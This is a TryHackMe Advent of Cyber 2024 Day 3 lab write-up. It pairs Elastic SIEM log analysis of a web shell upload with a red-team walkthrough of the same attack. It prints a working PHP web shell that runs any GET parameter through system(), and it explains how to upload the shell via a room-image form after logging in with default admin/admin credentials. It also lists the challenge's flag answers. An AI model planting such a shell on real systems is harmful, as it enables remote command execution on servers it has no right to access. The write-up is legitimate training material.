# 🎄 TryHackMe Advent of Cyber 2024 – Day 3: Log Analysis

## Objectives 🎯

1. Investigate suspicious activity on Frosty Pines Resort’s web server using Elastic SIEM.
2. Identify how a web shell was uploaded and accessed.
3. Exploit the same vulnerability to recreate the attack and retrieve the hidden flag.

## Steps 🚀

### Step 1: Investigating the Logs (Blue Team)

#### Setting Up Elastic SIEM
1. Logged into **Kibana** at `http://MACHINE_IP:5601`.
2. Selected the **frostypines-resorts** index under the **Discover** tab.
3. Adjusted the timeframe to:
   ```
   October 1, 2024, 00:00 – October 3, 2024, 20:00
   ```
4. Added relevant fields:
   - `requests`
   - `clientip`
5. Searched for `"shell.php"` in the `requests` field.

#### Findings
- **Where was the web shell uploaded to?**  
  **Answer:** `/media/images/rooms/shell.php`
- **What IP address accessed the web shell?**  
  **Answer:** `10.11.83.34`

### Step 2: Exploiting the RCE Vulnerability (Red Team)

#### Exploit Steps
1. **Edit Hosts File:**
   - Added `MACHINE_IP frostypines.thm` to `/etc/hosts`.
2. **Log In:**
   - Accessed `http://frostypines.thm` and logged in using:
     - **Username:** admin@frostypines.thm
     - **Password:** admin
3. **Prepare Web Shell:**
   - Created `shell.php` with the following code:
     ```
     <html>
     <body>
     <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
     <input type="text" name="command" autofocus id="command" size="50">
     <input type="submit" value="Execute">
     </form>
     <pre>
     <?php
         if(isset($_GET['command'])) 
         {
             system($_GET['command'] . ' 2>&1'); 
         }
     ?>
     </pre>
     </body>
     </html>
     ```
4. **Upload the Web Shell:**
   - Uploaded `shell.php` as the room image under “Add Room.”
5. **Locate the Shell:**
   - Confirmed the upload at:  
     `http://frostypines.thm/media/images/rooms/shell.php`
6. **Retrieve the Flag:**
   - Accessed the shell and executed:
     ```
     cat flag.txt
     ```

#### Result
- **What is the content of the flag.txt?**  
  **Answer:** `THM{Gl1tch_Was_H3r3}`

## Key Findings 🔑

1. **Upload Location:** The web shell was uploaded to `/media/images/rooms/shell.php`.
2. **Access Point:** The attacker’s IP was `10.11.83.34`.
3. **Exploit Success:** By recreating the attack, I retrieved the flag using the web shell.

## Lessons Learned 🌟

### Blue Team Insights
1. **Log Analysis Matters:** Elastic SIEM made it efficient to trace the attacker’s actions and pinpoint suspicious activity.
2. **Correlate Data:** Adding context with fields like `requests` and `clientip` accelerated the investigation.
3. **Monitoring Uploads:** Unvalidated file uploads are a significant security gap.

### Red Team Insights
1. **Web Shell Simplicity:** A basic PHP script can compromise a system, emphasizing the importance of validating uploaded files.
2. **Default Credentials Are Dangerous:** The admin account used weak credentials (`admin/admin`), making it an easy target.
3. **Defense Against Exploits:** Proper input validation and access controls could have mitigated this attack.

### Tools and Techniques 🛠️

1. **[Elastic SIEM](https://www.elastic.co/security/siem):** Used to investigate web server logs and identify attacker activity.  
2. **Text Editor:** Created the PHP web shell to exploit the vulnerability.  
3. **Browser:** Navigated and interacted with the Frosty Pines Resort website during the attack.  

## Final Thoughts 🎁

Day 3 highlighted the importance of both offensive and defensive skills in cybersecurity. Investigating the logs with Elastic SIEM provided clear insights into the attack, while exploiting the vulnerability demonstrated how impactful simple security oversights can be. Excited to tackle Day 4!

### Answers ✅
1. **Where was the web shell uploaded to?**  
   **Answer:** `/media/images/rooms/shell.php`
2. **What IP address accessed the web shell?**  
   **Answer:** `10.11.83.34`
3. **What is the content of the flag.txt?**  
   **Answer:** `THM{Gl1tch_Was_H3r3}`

## Table of Contents 📚

- [Main Page](README.md)
- [Day 1: OPSEC Challenge](day1.md)
- [Day 2: Log Analysis](day2.md)
- **Day 3: Log Analysis**
- [Day 4: Atomic Red Team](day4.md)
- [Day 5: XXE](day5.md)
- [Day 6: Sandboxes](day6.md)
- [Day 7: AWS Sandboxes](day7.md)
- [Day 8: Shellcodes](day8.md)
- [Day 9: Risk Assessment](day9.md)
- [Day 10: Phishing](day_10.md)
- [Day 11: Wi-Fi Attacks](day_11.md)
- [Day 12: Web Timing Attacks](day_12.md)
- [Day 13: WebSockets](day_13.md)
- [Day 14: Certificate Mismanagement](day_14.md)
- [Day 15: Active Directory](day_15.md)
- [Day 16: Azure Exploitation](day_16.md)
- [Day 17: Log Analysis](day_17.md)
- [Day 18: Prompt Injection](day_18.md)
- [More Days to Come!](#)
